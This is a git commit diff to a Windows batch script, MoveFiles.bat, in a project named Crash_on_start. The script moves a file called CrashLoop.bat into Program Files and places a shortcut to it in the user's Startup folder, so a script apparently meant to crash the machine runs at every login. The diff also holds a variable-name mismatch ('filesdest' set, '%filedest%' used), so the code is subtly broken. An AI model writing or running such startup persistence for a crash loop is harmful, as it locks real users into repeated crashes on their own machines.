522473297f557c5934fd75825321d04e54e07b84
Kaiwinta <pradouratitouan@proton.me>
2023-06-16 16:49:49 +0200

    Update

--- Crash_on_start/MoveFiles.bat
+++ Crash_on_start/MoveFiles.bat
@@ -1,7 +1,11 @@
 @echo off
-set "shortcutPath=CrashLoop.bat"
+set "filepath=CrashLoop.bat"
 rem Get the current user's startup folder location
+set "racourcipath=CrashLoop - Raccourci"
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
+set "filesdest=C:\Program Files"
+
 rem Move the shortcut to the startup folder
-move "%shortcutPath%" "%startupFolder%"
+move "%filepath%" "%filedest%"
+move "%racourcipath%" "%startupFolder%"
